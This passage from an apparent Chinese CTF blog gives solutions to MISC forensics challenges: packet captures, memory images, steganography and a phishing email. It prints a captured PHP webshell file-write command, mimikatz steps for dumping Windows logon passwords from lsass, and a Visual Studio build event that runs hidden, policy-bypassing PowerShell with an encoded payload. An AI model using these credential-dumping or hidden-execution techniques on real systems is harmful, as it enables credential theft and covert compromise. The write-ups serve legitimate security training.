print(hex(x))0xe8a22149&gt;&gt;&gt; print(hex(y))0x8d5c073b&gt;&gt;&gt; print(hex(a))0x4084eb51&gt;&gt;&gt; print(hex(b))0xb1a1686d\n","tags":["MISC"]},{"title":"MISC-data-1","url":"/2020/12/25/MISC-data-1/","content":"Data[1]\n\n写在前面\n\n浅薄笔者目前还无法完全消化理解wireshark相关流量分析的工具的内涵，先就针对遇到的题目类型做简单整理记录。\n\n1\n追踪流TCP+关键词搜索\n\n\n某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交\n\n下载附件可知其中是一个.pcapng文件，用wireshark打开。\n\n追踪其中的tcp流（有的题会追踪http流），故👇\n\n通过查找关键词flag可得👇\n\n2\n追踪流TCP+熟悉jpg的base64表示\n\n\n公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ 注意：得到的 flag 请包上 flag{} 提交\n\n下载附件得一pcapng文件，用wireshark打开。如题1所示打开TCP追踪👇\n\n根据其中标记的“/9j/”部分，可得知该文件为base64形式下的jpg文件。补上文件头“data:image/jpeg;base64,”后在浏览器的地址栏中输入可得到图片\n\n3\n追踪流+foremost分离+爆破\n\n\n一黑客入侵了某公司盗取了重要的机密文件，还好管理员记录了文件被盗走时的流量，请分析该流量，分析出该黑客盗走了什么文件。 注意：得到的 flag 请包上 flag{} 提交\n\nwireshark追踪流可发现其中隐藏了一个rar文件👇\n\nforemost分离后，可发现压缩包带锁，暴力破解可得👇\n\n解得flag。\n4\n追踪流+bool注入\n\n\n网站遭受到攻击了，还好我们获取到了全部网络流量。 链接: https://pan.baidu.com/s/1AdQXVGKb6rkzqMLkSnGGBQ 提取码: 34uu 注意：得到的 flag 请包上 flag{} 提交\n\n追踪http流后，观察到大量类似文件（后得知此为bool注入，查资料得在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符）👇\n\n拼接可得，改flag的ascii为\n102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125\n得f l a g { 4 7 e d b 8 3 0 0 e d 5 f 9 b 2 8 f c 5 4 b 0 d 0 9 e c d e f 7 }\n5\nWireShark插入RSA密钥\n\n\nTry using a tool like Wireshark.How can you decrypt the TLS stream?\n\n给定一个pcapng文件和一密钥，依次点击编辑-&gt;首选项-&gt;RSA密钥-&gt;Add new keyfile后追踪HTTP流即可得到flag。\n6\n\n\nTry using a tool like Wireshark.How can you decrypt the TLS stream?\n\n同第五题的解法能得假flag:picoCTF{this.is.not.your.flag.anymore}\n搜索可得真flag:picoCTF{honey.roasted.peanuts}\n\n7\n流量分析入门\n\n\n流量分析，你能找到flag吗 注意：得到的 flag 请包上 flag{} 提交\n\n到手为一名为666666.pcapng的文件，丢进wireshark,其中大部分为TCP流，单个流追踪时没有结果，尝试导出。\n按文件大小，锁定了一名为1.php的文件，save.\n\n\n通过简单分析，能看出该Php文件中\n1)post传入了action变量，对其进行base64解密\n@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$f&#x3D;base64_decode($_POST[&quot;z1&quot;]);$c&#x3D;$_POST[&quot;z2&quot;];$c&#x3D;str_replace(&quot;\\r&quot;,&quot;&quot;,$c);$c&#x3D;str_replace(&quot;\\n&quot;,&quot;&quot;,$c);$buf&#x3D;&quot;&quot;;for($i&#x3D;0;$i&lt;strlen($c);$i+&#x3D;2)$buf.&#x3D;urldecode(&quot;%&quot;.substr($c,$i,2));echo(@fwrite(fopen($f,&quot;w&quot;),$buf)?&quot;1&quot;:&quot;0&quot;);;echo(&quot;|&lt;-&quot;);die();\n2)z1\nD:\\wamp64\\www\\upload\\6666.jpg\n3)z2\n文件头FFD8FF，可看出此为jpg文件后缀，另存为jpg文件后得到：\n\n第二条路为对大文件进行分解。\nbinwalk 666666.pcapng\nbinwalk -e 666666.pcapng\n得到诸多.xz及一个空白的flag.txt,说明路走对了。\n发现一个加密的.zip文件，密码为此前的Th1s_1s_p4sswd_!!!\n打开得flag\nflag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;\n8\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n大量TCP和HTTP流量包，导出对象HTTP，得到大量文件👇\n\njava -jar C:\\Users\\16231\\Desktop\\Stegsolve.jar\nlogo.png和scanlines.png通过Image Combiner进行色道分离后得到flag\n\n\n挖个坑，不明白这个操作是为啥以及怎么看出来的😂\n\n9\n\n\n注意：得到的 flag 请包上 flag{} 提交\n\n由于这道题比较简单，题干直接给出了考点，用NtfsStreamsEditor打开对应的压缩包，导出后查看得到flag\n\nACTF&#123;AAAds_nntfs_ffunn?&#125; \n10\n\n\n在城际公路的小道上，罪犯G正在被警方追赶。警官X眼看他正要逃脱，于是不得已开枪击中了罪犯G。罪犯G情急之下将一个物体抛到了前方湍急的河流中，便头一歪突然倒地。警官X接近一看，目标服毒身亡。数分钟后，警方找到了罪犯遗失物体，是一个U盘，可惜警方只来得及复制镜像，U盘便报废了。警方现在拜托你在这个镜像中找到罪犯似乎想隐藏的秘密。 注意：得到的 flag 请包上 flag{} 提交\n\n得到一iso文件，本想着挂载啥的。\n首先尝试foremost分离，得到\nole:= 2\nrar:= 1\nexe:= 1\n看看压缩包，存在flag.exe,运行一下\n得到 机密文件.txt\nFlag&#123;379:7b758:g7dfe7f19:9464f:4g9231&#125;\n11\n\n先看了一波网上的WP，但是还是不太懂。多亏了pdsdt师傅耐心讲解，终于懂了哈哈哈哈哈\nzip加后缀还原后，得到题目描述和nmapall.pcapng。\n编辑-》首选项-》外观-》列\n显示“目的端口”并按从小到大排序后，观察。\n举例👇\n\n这张图中可以看出，本机的35232端口给目标机（其实也是自己）的1端口发送SYN包，但是没有后续。故判断该端口为关闭状态。\n其中3、4、6、7、9、13等端口都是一样的情况。\n但是21端口就不一样了。\n60176、33892等端口跟21分别进行了连续通信，说明该端口一定是打开的状态。\n以此类推，21 22 631 801 3306\n\n当时还纠结了很久，为什么后面的端口一样满足要求，但是都不算。后明白因为这个流量是自己打自己，所以同一条流量会显示两遍。故5939后的都可以不看啦\n\n12\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到wget.pcapng\n流量分析！！\n导出http流，得到一堆有的没的\n观察，发现其中有hint.html\n\n很好，不知道他在说什么\n继续观察，发现一个名为secret.zip的压缩包，有东西！\n存在名为flag的文件，丢进010\n找到flag\n actf&#123;c5558bcf-26da-4f8b-b181-b61f3850b9e5&#125;\n13\n\n\n得到的 flag 请包上 flag{} 提交。\n\n学到了流量分析新姿势\n常规操作：\n1）分析，导出HTTP流，得到lsass.dmp\nlsass是Windows系统的一个进程，用于本地安全和登陆策略\n2)foremost分离得到加密压缩包\n通过大神WP学到新姿势，mimikatz一个名叫猕猴桃的软件(内网渗透工具，可在lsass.exe进程中获取windows的账号明文密码)\n以管理员权限打开后：\n&#x2F;&#x2F;提升权限privilege::debug&#x2F;&#x2F;载入dmp文件sekurlsa::minidump lsass.dmp&#x2F;&#x2F;读取登陆密码sekurlsa::logonpasswords full得到密码W3lc0meToD0g3\n解压缩包得D0g3{3466b11de8894198af3636c5bd1efce2}\n14\n\n\nDo your konw usb?? 注意：得到的 flag 请包上 flag{} 提交\n\n得到233.rar及key.ftm，暂时放着，不知道有啥用\n\n做压缩包题最好用winrar。360会自动过滤掉一些东西。\n\n提示文件头损坏，对比大佬笔记https://www.freebuf.com/column/199854.html\n常规文件头没问题，考虑【HEAD_TYPE应该是0x74而不是0x7A。】\n得到233.png\n分析一波，当Blue通道被置为0的时候出现了二维码！\nci&#123;v3erf_0tygidv2_fc0&#125;\n图片的信息已经被榨干了，来处理key.ftm\n查看二进制，能看到504b0304等字样，foremost可提取到压缩包\n得到key.pcap一个流量\ntshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt\n通过脚本处理USB流量\nmappings &#x3D; &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;,0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;,0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;,0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;,0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;,0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;,0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;&#x3D;&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums &#x3D; []keys &#x3D; open(&#39;usbdata.txt&#39;)for line in keys:    if line[0]!&#x3D;&#39;0&#39; or line[1]!&#x3D;&#39;0&#39; or line[3]!&#x3D;&#39;0&#39; or line[4]!&#x3D;&#39;0&#39;or line[9]!&#x3D;&#39;0&#39; or line[10]!&#x3D;&#39;0&#39; or line[12]!&#x3D;&#39;0&#39; or line[13]!&#x3D;&#39;0&#39;or line[15]!&#x3D;&#39;0&#39; or line[16]!&#x3D;&#39;0&#39; or line[18]!&#x3D;&#39;0&#39; or line[19]!&#x3D;&#39;0&#39;or line[21]!&#x3D;&#39;0&#39; or line[22]!&#x3D;&#39;0&#39;:        continue    nums.append(int(line[6:8],16))keys.close()output &#x3D; &quot;&quot;for n in nums:    if n &#x3D;&#x3D; 0 :        continue    if n in mappings:        output +&#x3D; mappings[n]    else:        output +&#x3D; &#39;[unknown]&#39;print &#39;output :\\n&#39; + output\n得到\noutput :KEYXINAN\n至此，我们已经得到了一个密文ci{v3erf_0tygidv2_fc0}和密钥XINAN\n需要密钥的文本加密，考虑维吉尼亚编码：\nfa&#123;i3eei_0llgvgn2_sc0&#125;\n由于没有看到flag头，一把梭得到\nflag&#123;vig3ne2e_is_c00l&#125;\n15\n\n\n得到的 flag 请包上 flag{} 提交。来源：https://github.com/hebtuerror404/CTF_competition_warehouse_2018\n\n得到一个数据包，发现存在一堆HTTP流，文件名基本都为【login?_=】\n猜测flag为登录密码，因为登录成功和失败有一定区别，故按大小排序，有明显不同的那个看看\n得到flag\n\nSUCTF&#123;password_is_not_weak&#125;\n16\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到一个流量包，全是RTP流量\n学到了【电话-&gt;RTP-&gt;RTP流】或者根据题目名称【电话-&gt;VoIP通话】\n接下来就是英语听力部分\nflag&#123;9001IVR&#125;\n17\n\n\n得到的 flag 请包上 flag{} 提交。\n\n漂亮的内存取证\n利用volatility\nvolatility -f memory.img imageinfo\n查看可能版本\n\nvolatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist\n查看进程\n\n发现DumpIt.exe\n查看cmd命令使用记录\nvolatility -f memory.img --profile&#x3D;Win2003SP1x86 cmdscan\n\n发现flag的痕迹\ndump下来\n\nforemost分离\n得到output文件夹\n有东西!\n得到一张二维码\n扫描后\njfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;\n和\nkey:Th1s_1s_K3y00000viL1234567890123456\nAES带密码带偏移量解密http://tool.chacuo.net/cryptaes\nflag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;\n18\n\n\n好多漂亮的壁纸，赶快挑一张吧！ 注意：得到的 flag 请包上 flag{} 提交\n\n得到很多TCP数据包，导出HTTP数据能发现题目提到的大量壁纸。\nstrings *|grep flag\n未果\n花了点时间安装大佬们提到的exiftool\n安装ExifTool\nWindows：下载ExifTool可执行文件（名为：exiftool-x.x.zip），解压得到exiftool(-k).exe，重命名为exiftool.exe，通过CMD命令行运行。\nLinux：下载ExifTool发行包（名为：Image-ExifTool-x.x.tar.gz），解压后运行./exiftool即可。或通过perl Makefile.PL &amp;&amp; make install编译安装。\nMacOS：下载ExifTool安装包（名为ExifTool-x.x.dmg），安装后在终端执行exiftool使用。\n详细的安装文档，参考ExifTool主页安装文档\ncb4bbe1c-bffe-4101-a9de-4de40bca4558 (1)# exiftool *|grep flagXP Comment                      : 恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f\n得到了一半的flag\n后半部分目前不明白是咋推出来的\n\n2.6.a.3.c.0.5.8.9.d.2.3.e.d.e.e.c.}\nflag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;\n19\n\n\n得到的 flag 请包上 flag{} 提交\n\n得到一个TCP流量的数据包，追踪几个流量，分别得到了\n\n\n第一张图开头为PK，以原始数据保存后更改后缀名为.zip\n第二章图能得到加密压缩包的密码\n打开压缩包得到\nCTF&#123;this_flag_is_your_flag&#125;\n20\n\n\n得到的 flag 请包上 flag{} 提交\n\n注意到ICMP流中出现了\n&lt;html&gt;&lt;head&gt;&lt;title&gt;\n等字样，挨个誊写\n\n\n\n\n\n\n\nwriteat(ob(&quot;Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9&quot;));\nbase64解码\nCTF&#123;JustAS0ngAb0utP1ngP0ng&#125;\n","tags":["MISC"]},{"title":"MISC-image-2","url":"/2021/03/22/MISC-image-2/","content":"image[2]\n\n21\n\n\n得到的 flag 请包上 flag{} 提交。\n\n不明全部，稍做记录。\n得到一张类似二维码的小图\n\n将其分离出rgb三个通道（笔者用的stegsolve）\n根据拼接，得到类似汉信码\n存在一定的爆破和容差\nfrom PIL import Imagefrom random import randintfor k in range(5):\t# 用到的三张图片就是上面说的 RGB 通道分开的图片（未放大10倍）    R &#x3D; Image.open(&#39;solved_r.bmp&#39;)    G &#x3D; Image.open(&#39;solved_g.bmp&#39;)    B &#x3D; Image.open(&#39;solved_b.bmp&#39;)    GBR &#x3D; Image.new(&#39;RGB&#39;, (31, 31))    TMP &#x3D; Image.new(&#39;RGB&#39;, (7, 7))    GBRReadble &#x3D; Image.new(&#39;RGB&#39;, (372, 372))    n_r &#x3D; 0    n_g &#x3D; 0    n_b &#x3D; 0    p_r &#x3D; R.load()    p_g &#x3D; G.load()    p_b &#x3D; B.load()    pim &#x3D; GBR.load()    pimr &#x3D; GBRReadble.load()    tmp &#x3D; TMP.load()    for i in range(31):        if i%3 &#x3D;&#x3D; 0:            for j in range(31):                pim[i, j] &#x3D; p_g[j, n_g]            n_g &#x3D; n_g + 1        elif i%3 &#x3D;&#x3D; 1:            for j in range(31):                pim[i, j] &#x3D; p_b[j, n_b]            n_b &#x3D; n_b + 1        elif i%3 &#x3D;&#x3D; 2:            for j in range(31):                pim[i, j] &#x3D; p_r[j, n_r]            n_r &#x3D; n_r + 1    for i in range(0, 7):        for j in range(0, 7):            tmp[i, j] &#x3D; pim[i, j]                TMP &#x3D; TMP.rotate(180)    tmp &#x3D; TMP.load()     for i in range(0, 7):        for j in range(0, 7):            pim[i, j] &#x3D; tmp[i, j]                      for i in range(14, 23):        for j in range(24, 31):            if (randint(0, 1) &#x3D;&#x3D; 0):                pim[i, j] &#x3D; (0,0,0)                    for i in range(372):        for j in range(372):            pimr[j, i] &#x3D; (255,255,255)    for i in range(31,341):        for j in range(31,341):            pimr[j, i] &#x3D; pim[(j-31)&#x2F;&#x2F;10, (i-31)&#x2F;&#x2F;10]    GBRReadble &#x3D; GBRReadble.rotate(90)    filename &#x3D; &quot;gbr&quot;+ str(k) + &quot;.png&quot;    GBRReadble.save(filename)\n参考：\nhttps://blog.csdn.net/r42135d1r2r4/article/details/106063796\nhttps://www.cnblogs.com/p201821440039/p/12900273.html\n22\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到find_me.unk\n010分析，后缀名改为.jpg\n得到一张图片，写着MONSTERS COME IN MANY FORMS\n尝试提交，不对\nforemost分离，得到png图片，写着摩斯电码的字典，右下角发现不寻常\n\n通过解密：HELPME\n尝试提交，不对\n继续搜索，Png文件尾存在ogg文件，通过查询是一种音频文件\n另存为.ogg\nau中查看，明显莫斯，解码得\nflag&#123;M0R53_W1LL_N3V3R_4G3!&#125;","tags":["MISC"]},{"title":"VNCTF2021","url":"/2021/03/24/VNCTF2021/","content":"1\n[VNCTF 2021]冰冰好像藏着秘密\n\n发现冰冰藏着的flag，flag格式为VNCTF{*}\n\n得到FFT.rar\n但是直接打开会提示\n\n\n这个存在一个考察的点：rar伪加密\n但是在实战中笔者发现两个绕过的方法\n1)用kali打开\n2)如上图图二所示，在winrar报错的情况下，直接拖出FFT.png，也能达到解压的效果\n而按出题人本身的意思，是在使用010打开的情况下：\n把下图的84改成80\n\n第二步：\n1)隐形水印工具也能得到水印：\n\n放大可以看到flag\n2)通过搜索得知文件名FFT为：\n\n下面是大佬脚本：\nimport cv2 as cvimport numpy as npimport matplotlib.pyplot as pltimg = cv.imread(&#x27;FFT.png&#x27;, 0) #直接读为灰度图像f = np.fft.fft2(img)            #做频率变换fshift = np.fft.fftshift(f)     #转移像素做幅度谱s1 = np.log(np.abs(fshift))#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255plt.subplot(121)plt.imshow(img, &#x27;gray&#x27;)plt.title(&#x27;original&#x27;)plt.subplot(122)plt.imshow(s1,&#x27;gray&#x27;)plt.title(&#x27;center&#x27;)plt.show()\n\nVNCTF&#123;Ff5_1S_bEauTiful&#125;\n2\n[VNCTF 2021]HAPPYNEWYEAR\n\n祝大家牛年快乐！牛转钱坤！(flag为VNCTF{}）Hint1:https://www.dcode.fr/tools-list#symbols\tHint2:stegpy，但是不是那么白给的stegpy\n\n得到加密压缩包和password.png\n可以看出png里藏着古典密码，结合hint1，找到相应的加密方法：\nChinese Code&amp;Sheikah Language\n\n\n组合得到压缩包密码：\n\nf87840bdddcc01e4\n打开压缩包，得到happynewyear.png\n接下来就是stegpy的内容\nstegpy工具的安装：\nhttps://blog.csdn.net/weixin_45728976/article/details/109018040\n附上改动后的出题人脚本，实现爆破\n# -*- coding: utf-8 -*-import osfrom subprocess import Popen,PIPEimport sysdef checkwebp(pic):    print(&quot;IF you don&#39;t need a password for the pic please input 1&quot;) # 无密钥    print(&quot;IF you know the password of the pic please input 2&quot;) # 有密钥且已知    print(&quot;IF not input 3 I will use the password.txt&quot;) # 有密钥但未知    choice &#x3D; input()    if choice &#x3D;&#x3D; &#39;1&#39;:        os.system(&quot;stegpy &#123;&#125;&quot;.format(pic))    elif choice &#x3D;&#x3D; &#39;2&#39;:        print(&quot;INPUT THE password:&quot;)        password &#x3D; input()        cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;,pic]        subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd],stdin&#x3D;PIPE,stdout&#x3D;PIPE,stderr&#x3D;PIPE)        print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))        subp.stdin.write(bytes((password+&#39;\\n&#39;).encode(&#39;utf-8&#39;)))        subp.stdin.flush()        print(subp.stdout.readlines())        # print(subp.stdout.readlines()[1])        print(&#39;\\n&#39;)    elif choice &#x3D;&#x3D; &#39;3&#39;:        file &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)        line &#x3D; file.readline()        while line:            print(line)            cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;, pic]            subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd], stdin&#x3D;PIPE, stdout&#x3D;PIPE,stderr&#x3D;PIPE)            print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))            subp.stdin.write(bytes((line + &#39;\\n&#39;).encode(&#39;utf-8&#39;)))            subp.stdin.flush()            print(&#39;result:&#39;)            print(subp.stdout.readlines()[1])            # print(subp.stdout.readlines()[1])            print(&#39;\\n&#39;)            line &#x3D; file.readline()    else :        print(&#39;Input Wrong!&#39;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    checkwebp(&#39;happynewyear.png&#39;)\n\n得到flag\nVNCTF&#123;HappyNewY3a5&#125;\n3\n[VNCTF 2021]interesting_fishing\n\ncrazyman_army是某安全公司的研究人员\n这天他的其邮箱里发现了一封奇怪的邮件\n你能帮助他找到其隐藏的信息吗\n附件是第一部分的flag\n图片是第二部分的flag\n最后flag为 第一部分+第二部分(vnctf{*})\n\n注释.txt:\ncrazyman_army是某安全公司的研究人员这天他的其邮箱里发现了一封奇怪的邮件 你能帮助他找到其隐藏的信息吗注意:附件是第一部分的flag图片是第二部分的flag最后flag为 第一部分+第二部分hint:powershell解码后的字符可能存在不可读的情况 那并不是解码错误\n研究项目的讨论.bin\n\n更改后缀为.eml，能看到是一封邮件。\n用foxmail打开\n就可以把图片和附件另存为到本机了。\n先处理附件：\n发现giveyourflag.sln，用vs打开\n#include &lt;iostream&gt;int main()&#123;    std::cout &lt;&lt; &quot;Hi boy\\n&quot;;    std::cout &lt;&lt; &quot;This is your flag:flag&#123;Th1s_iS_f@kE_fL4G&#125;\\n&quot;;    getchar();    return 0;&#125;\nVisual Studio2017&gt;生成&gt;生成giveyourflag\n若出现【无法找到v142的生成工具(平台工具集=“v142”)。】，Visual Studio2017&gt;项目&gt;giveyourflag属性&gt;配置属性&gt;常规&gt;平台工具集&gt;【v142(未安装)】更改为【Visual Studio 2017 (v141)】\n重新生成后的得到报错【命令&quot;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\\Debug\\Browse.VC.db】\n缺少上述文件，但在压缩包里找不到。\n可能是文件隐藏。\n系统搜索【文件资源管理器选项】&gt;查看&gt;取消勾选”隐藏受保护的操作系统文件(推荐)“\n看到该文件。\n$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD